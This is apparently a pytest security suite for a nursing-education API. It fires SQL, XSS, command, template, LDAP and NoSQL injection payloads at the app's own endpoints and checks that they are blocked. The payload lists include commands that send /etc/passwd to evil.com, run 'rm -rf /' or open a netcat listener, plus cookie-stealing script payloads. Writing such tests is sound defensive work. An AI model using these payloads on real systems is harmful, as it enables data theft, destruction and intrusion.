"""
Comprehensive Injection Prevention Tests for RAGnostic → BSN Knowledge Pipeline

Tests SQL injection, XSS, command injection, LDAP injection, and other
code injection vulnerabilities with enterprise-grade security validation.
"""

import time
from unittest.mock import MagicMock, patch

import pytest
from fastapi import status
from fastapi.testclient import TestClient

from src.services.ragnostic_client import RAGnosticClient


@pytest.mark.security
class TestSQLInjectionPrevention:
    """Comprehensive SQL injection prevention tests."""

    def test_classic_sql_injection_patterns(self, client: TestClient, auth_headers):
        """Test prevention of classic SQL injection patterns."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwd'); --",
            "admin'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "' UNION SELECT password, email FROM users WHERE '1'='1",
            "1' AND SLEEP(5) --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "'; WAITFOR DELAY '00:00:05'; --",
        ]

        # Test various endpoints that could be vulnerable
        vulnerable_endpoints = [
            ("/api/v1/analytics/student/{}", "GET"),
            ("/api/v1/assessment/competency/profile/{}", "GET"),
            ("/api/v1/auth/users?username={}", "GET"),
        ]

        for payload in sql_injection_payloads:
            for endpoint_template, method in vulnerable_endpoints:
                endpoint = endpoint_template.format(payload)

                if method == "GET":
                    response = client.get(
                        endpoint, headers=auth_headers.get("instructor1", {})
                    )
                else:
                    response = client.post(
                        endpoint, headers=auth_headers.get("instructor1", {})
                    )

                # Should not cause server errors
                assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

                # Should return appropriate error codes
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_401_UNAUTHORIZED,
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                    status.HTTP_422_UNPROCESSABLE_ENTITY,
                ]

                # Response should not contain SQL error messages
                response_text = response.text.lower()
                sql_error_indicators = [
                    "syntax error",
                    "mysql",
                    "postgresql",
                    "sqlite",
                    "table",
                    "column",
                    "database",
                    "constraint",
                    "foreign key",
                ]

                for indicator in sql_error_indicators:
                    assert (
                        indicator not in response_text
                    ), f"SQL error leaked in response for payload: {payload}"

    def test_blind_sql_injection_prevention(self, client: TestClient, auth_headers):
        """Test prevention of blind SQL injection attacks."""
        blind_sql_payloads = [
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5 --",
            "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 65 --",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
            "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        ]

        client.get(
            "/api/v1/analytics/student/valid_id",
            headers=auth_headers["instructor1"],
        )
        baseline_time = time.time()
        client.get(
            "/api/v1/analytics/student/valid_id",
            headers=auth_headers["instructor1"],
        )
        baseline_duration = time.time() - baseline_time

        for payload in blind_sql_payloads:
            test_time = time.time()
            response = client.get(
                f"/api/v1/analytics/student/{payload}",
                headers=auth_headers["instructor1"],
            )
            test_duration = time.time() - test_time

            # Response time should not significantly differ (no time-based attacks)
            time_diff = abs(test_duration - baseline_duration)
            assert time_diff < 2.0, f"Potential time-based SQL injection: {payload}"

            # Status code should be consistent with invalid input
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_404_NOT_FOUND,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]

    def test_second_order_sql_injection_prevention(
        self, client: TestClient, auth_headers
    ):
        """Test prevention of second-order SQL injection attacks."""
        # Create content with SQL injection payload
        malicious_topics = [
            "Nursing'; DROP TABLE assessments; --",
            "Patient Care' OR 1=1 --",
            "Medication'; INSERT INTO grades VALUES ('A+'); --",
        ]

        for topic in malicious_topics:
            # First request: store malicious data
            create_response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": topic,
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            # Should handle malicious input safely
            if create_response.status_code == status.HTTP_200_OK:
                # Second request: retrieve data (potential injection execution point)
                retrieve_response = client.get(
                    "/api/v1/study-guide",
                    headers=auth_headers["student1"],
                )

                # Should not execute SQL injection on retrieval
                assert (
                    retrieve_response.status_code
                    != status.HTTP_500_INTERNAL_SERVER_ERROR
                )

                # Response should not contain SQL error messages
                response_text = retrieve_response.text.lower()
                assert "drop table" not in response_text
                assert "insert into" not in response_text


@pytest.mark.security
class TestXSSPrevention:
    """Cross-site scripting (XSS) prevention tests."""

    def test_reflected_xss_prevention(self, client: TestClient, auth_headers):
        """Test prevention of reflected XSS attacks."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src='x' onerror='alert(1)'>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(1)'></iframe>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "<body onload=alert('xss')>",
            "<input type='text' value='' onclick='alert(1)' />",
        ]

        # Test XSS in various contexts
        test_endpoints = [
            ("/api/v1/study-guide/create", "POST", "topic"),
            ("/api/v1/nclex/generate", "POST", "topic"),
            (
                "/api/v1/clinical-support/scenarios/generate",
                "POST",
                "clinical_scenario",
            ),
        ]

        for payload in xss_payloads:
            for endpoint, method, field in test_endpoints:
                request_data = {
                    field: payload,
                    "competencies": ["AACN_KNOWLEDGE_1"] if field == "topic" else None,
                    "difficulty": "medium" if "nclex" in endpoint else None,
                    "question_count": 5 if "nclex" in endpoint else None,
                    "complexity_level": "advanced" if "scenarios" in endpoint else None,
                }
                # Remove None values
                request_data = {k: v for k, v in request_data.items() if v is not None}

                if method == "POST":
                    response = client.post(
                        endpoint,
                        json=request_data,
                        headers=auth_headers["student1"],
                    )
                else:
                    response = client.get(
                        endpoint,
                        params=request_data,
                        headers=auth_headers["student1"],
                    )

                if response.status_code == status.HTTP_200_OK:
                    response_text = response.text

                    # XSS payloads should be escaped or removed
                    dangerous_patterns = [
                        "<script>",
                        "</script>",
                        "onerror=",
                        "onload=",
                        "javascript:",
                        "<iframe",
                        "</iframe>",
                        "onclick=",
                        "alert(",
                    ]

                    for pattern in dangerous_patterns:
                        assert (
                            pattern.lower() not in response_text.lower()
                        ), f"XSS pattern '{pattern}' found in response for payload: {payload}"

    def test_stored_xss_prevention(self, client: TestClient, auth_headers):
        """Test prevention of stored XSS attacks."""
        stored_xss_payloads = [
            "<script>document.cookie='stolen'</script>",
            "<img src=x onerror=fetch('//evil.com?'+document.cookie)>",
            "<svg/onload=eval(atob('YWxlcnQoMSk='))>",  # Base64 encoded alert(1)
        ]

        for payload in stored_xss_payloads:
            # Store XSS payload
            store_response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": "Test Topic",
                    "competencies": ["AACN_KNOWLEDGE_1"],
                    "description": payload,  # Store malicious content
                },
                headers=auth_headers["student1"],
            )

            if store_response.status_code == status.HTTP_200_OK:
                # Retrieve stored content
                retrieve_response = client.get(
                    "/api/v1/study-guide",
                    headers=auth_headers["student1"],
                )

                if retrieve_response.status_code == status.HTTP_200_OK:
                    response_text = retrieve_response.text.lower()

                    # Stored XSS should be neutralized
                    xss_indicators = [
                        "<script",
                        "onerror=",
                        "onload=",
                        "document.cookie",
                        "eval(",
                        "atob(",
                    ]

                    for indicator in xss_indicators:
                        assert (
                            indicator not in response_text
                        ), f"Stored XSS vulnerability: {indicator} found in response"

    def test_dom_xss_prevention(self, client: TestClient, auth_headers):
        """Test prevention of DOM-based XSS attacks."""
        # Test JSON responses that could be used in DOM manipulation
        dom_xss_payloads = [
            '"}<script>alert(1)</script>',
            '"</script><script>alert(1)</script>',
            "</title><script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
        ]

        for payload in dom_xss_payloads:
            response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": payload,
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            if response.status_code == status.HTTP_200_OK:
                # Check JSON response structure
                try:
                    response_json = response.json()
                    response_str = str(response_json)

                    # Should not contain unescaped script tags or events
                    assert "<script>" not in response_str
                    assert "onerror=" not in response_str
                    assert "alert(" not in response_str
                except Exception:
                    # Non-JSON response is acceptable for security
                    pass


@pytest.mark.security
class TestCommandInjectionPrevention:
    """Command injection prevention tests."""

    def test_os_command_injection_prevention(self, client: TestClient, auth_headers):
        """Test prevention of OS command injection attacks."""
        command_injection_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; rm -rf /",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ping -c 10 127.0.0.1",
            "| nc -l 4444",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
            "&& whoami",
            "|| id",
            "; ls -la /",
            "| ps aux",
            "; netstat -an",
            "$(whoami)",
            "`id`",
        ]

        # Test endpoints that might process user input in system calls
        test_endpoints = [
            ("/api/v1/study-guide/create", "POST", "topic"),
            ("/api/v1/nclex/generate", "POST", "topic"),
            (
                "/api/v1/clinical-support/scenarios/generate",
                "POST",
                "clinical_scenario",
            ),
        ]

        for payload in command_injection_payloads:
            for endpoint, _method, field in test_endpoints:
                request_data = {
                    field: f"Nursing Care {payload}",
                    "competencies": ["AACN_KNOWLEDGE_1"] if field == "topic" else None,
                    "difficulty": "medium" if "nclex" in endpoint else None,
                    "question_count": 5 if "nclex" in endpoint else None,
                    "complexity_level": "basic" if "scenarios" in endpoint else None,
                }
                # Remove None values
                request_data = {k: v for k, v in request_data.items() if v is not None}

                response = client.post(
                    endpoint,
                    json=request_data,
                    headers=auth_headers["student1"],
                )

                # Should not execute commands or cause server errors
                assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

                if response.status_code == status.HTTP_200_OK:
                    response_text = response.text

                    # Should not contain command execution results
                    command_output_indicators = [
                        "root:x:",
                        "/bin/bash",
                        "uid=",
                        "gid=",
                        "LISTEN",
                        "tcp",
                        "udp",
                        "/home/",
                        "/etc/",
                        "drwx",
                        "-rw-",
                    ]

                    for indicator in command_output_indicators:
                        assert (
                            indicator not in response_text
                        ), f"Command execution detected for payload: {payload}"

    def test_template_injection_prevention(self, client: TestClient, auth_headers):
        """Test prevention of template injection attacks."""
        template_injection_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "<%= 7*7 %>",
            "{{request}}",
            "{{session}}",
        ]

        for payload in template_injection_payloads:
            response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": f"Medical Template {payload}",
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            if response.status_code == status.HTTP_200_OK:
                response_text = response.text

                # Template injection should not be executed
                # Common outputs that indicate successful injection
                injection_indicators = [
                    "49",  # 7*7 result
                    "<class",
                    "__subclasses__",
                    "config",
                    "session",
                    "request",
                ]

                for indicator in injection_indicators:
                    assert (
                        indicator not in response_text
                    ), f"Template injection executed for payload: {payload}"


@pytest.mark.security
class TestLDAPInjectionPrevention:
    """LDAP injection prevention tests."""

    def test_ldap_injection_patterns(self, client: TestClient):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(|(uid=admin))",
            "*))%00",
            "*)(|(objectClass=*))",
            "admin)(|(cn=*))",
            "*)(userPassword=*)",
            "*))(|(cn=*))",
        ]

        for payload in ldap_injection_payloads:
            # Test in login endpoint (most likely LDAP usage)
            response = client.post(
                "/api/v1/auth/login",
                json={"username": payload, "password": "test"},
            )

            # Should handle gracefully without server errors
            assert response.status_code in [
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ]
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

            # Response should not contain LDAP error messages
            response_text = response.text.lower()
            ldap_error_indicators = [
                "ldap",
                "distinguished name",
                "objectclass",
                "directory",
                "bind",
            ]

            for indicator in ldap_error_indicators:
                assert (
                    indicator not in response_text
                ), f"LDAP error message leaked for payload: {payload}"


@pytest.mark.security
class TestNoSQLInjectionPrevention:
    """NoSQL injection prevention tests."""

    def test_mongodb_injection_prevention(self, client: TestClient, auth_headers):
        """Test prevention of MongoDB injection attacks."""
        nosql_injection_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == \'admin\'"}',
            '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
            'true, $where: "1 == 1"',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
            '{"username": {"$regex": "^adm"}}',
        ]

        for payload in nosql_injection_payloads:
            # Test in various endpoints that might use NoSQL
            response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": f"Database Topic {payload}",
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            # Should not cause server errors
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR

            if response.status_code == status.HTTP_200_OK:
                response_text = response.text

                # Should not contain NoSQL-specific error messages
                nosql_error_indicators = [
                    "mongodb",
                    "bson",
                    "objectid",
                    "cursor",
                    "aggregation",
                ]

                for indicator in nosql_error_indicators:
                    assert (
                        indicator.lower() not in response_text.lower()
                    ), f"NoSQL error leaked for payload: {payload}"


@pytest.mark.security
class TestRAGnosticServiceInjectionSecurity:
    """Test injection security for RAGnostic service integration."""

    @patch("src.services.ragnostic_client.httpx.AsyncClient")
    async def test_ragnostic_query_injection_prevention(self, mock_client):
        """Test that queries to RAGnostic service are properly sanitized."""
        # Mock successful response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"items": [], "total": 0}
        mock_client.return_value.request.return_value = mock_response

        client = RAGnosticClient()

        # Test various injection payloads
        injection_queries = [
            "test'; DROP TABLE content; --",
            "<script>alert('xss')</script>",
            "; rm -rf /",
            "{{7*7}}",
            '{"$gt": ""}',
        ]

        for query in injection_queries:
            # Should sanitize query before sending to RAGnostic
            await client.search_content(query)

            # Verify the request was made (basic functionality works)
            assert mock_client.return_value.request.called

            # In production, verify that the query was sanitized
            # This would require inspecting the actual request sent
            call_args = mock_client.return_value.request.call_args
            if call_args:
                sent_data = call_args[1].get("json", {})
                sent_query = sent_data.get("query", "")

                # Basic validation - dangerous patterns should be escaped/removed
                assert "DROP TABLE" not in sent_query.upper()
                assert "<script>" not in sent_query.lower()
                assert "rm -rf" not in sent_query

    def test_ragnostic_filter_injection_security(
        self, client: TestClient, auth_headers
    ):
        """Test that filters passed to RAGnostic are secure."""
        malicious_filters = [
            '{"$where": "this.secret == true"}',
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ]

        with patch(
            "src.services.ragnostic_client.RAGnosticClient.search_content"
        ) as mock_search:
            mock_search.return_value = {"items": [], "total": 0}

            for malicious_filter in malicious_filters:
                # This would typically be processed through content generation
                response = client.post(
                    "/api/v1/study-guide/create",
                    json={
                        "topic": "Nursing Care",
                        "competencies": ["AACN_KNOWLEDGE_1"],
                        "filters": malicious_filter,  # If filters are accepted
                    },
                    headers=auth_headers["student1"],
                )

                # Should not cause server errors due to filter injection
                assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR


@pytest.mark.security
class TestInputSanitizationComprehensive:
    """Comprehensive input sanitization tests across all endpoints."""

    def test_medical_content_injection_prevention(
        self, client: TestClient, auth_headers
    ):
        """Test prevention of malicious content injection in medical contexts."""
        medical_injection_payloads = [
            "Take 1000mg of cyanide daily <script>steal_data()</script>",
            "Patient assessment'; DROP TABLE patient_records; --",
            "Administer {{system.admin_password}} medication",
            "Nursing intervention | cat /etc/passwd",
            "Clinical decision support <img src=x onerror=fetch('//evil.com')>",
        ]

        for payload in medical_injection_payloads:
            response = client.post(
                "/api/v1/clinical-support/scenarios/generate",
                json={
                    "clinical_scenario": payload,
                    "complexity_level": "advanced",
                },
                headers=auth_headers["student1"],
            )

            # Should handle malicious medical content safely
            if response.status_code == status.HTTP_200_OK:
                response_text = response.text.lower()

                # Should not contain dangerous elements
                dangerous_elements = [
                    "cyanide",
                    "drop table",
                    "<script>",
                    "cat /etc/passwd",
                    "onerror=",
                    "system.",
                    "admin_password",
                ]

                for element in dangerous_elements:
                    assert (
                        element not in response_text
                    ), f"Dangerous medical content not filtered: {element}"

    def test_unicode_and_encoding_attacks(self, client: TestClient, auth_headers):
        """Test prevention of Unicode and encoding-based attacks."""
        encoding_attack_payloads = [
            "\u003cscript\u003ealert(1)\u003c/script\u003e",  # Unicode encoded script
            "\x3cscript\x3ealert(1)\x3c/script\x3e",  # Hex encoded
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # URL encoded
            "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML entities
            "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",  # Fullwidth Unicode
        ]

        for payload in encoding_attack_payloads:
            response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": f"Medical Topic {payload}",
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            if response.status_code == status.HTTP_200_OK:
                response_text = response.text

                # Encoded attacks should be neutralized
                assert "<script>" not in response_text.lower()
                assert "alert(" not in response_text.lower()
                assert "onerror=" not in response_text.lower()

    def test_null_byte_injection_prevention(self, client: TestClient, auth_headers):
        """Test prevention of null byte injection attacks."""
        null_byte_payloads = [
            "valid_topic\x00<script>alert(1)</script>",
            "nursing\x00.txt",
            "content\x00'; DROP TABLE users; --",
            "medical\x00\n\r<iframe src='javascript:alert(1)'></iframe>",
        ]

        for payload in null_byte_payloads:
            response = client.post(
                "/api/v1/study-guide/create",
                json={
                    "topic": payload,
                    "competencies": ["AACN_KNOWLEDGE_1"],
                },
                headers=auth_headers["student1"],
            )

            # Should handle null bytes safely
            if response.status_code == status.HTTP_200_OK:
                response_text = response.text

                # Null bytes should be removed/handled
                assert "\x00" not in response_text
                assert "<script>" not in response_text.lower()
                assert "<iframe" not in response_text.lower()
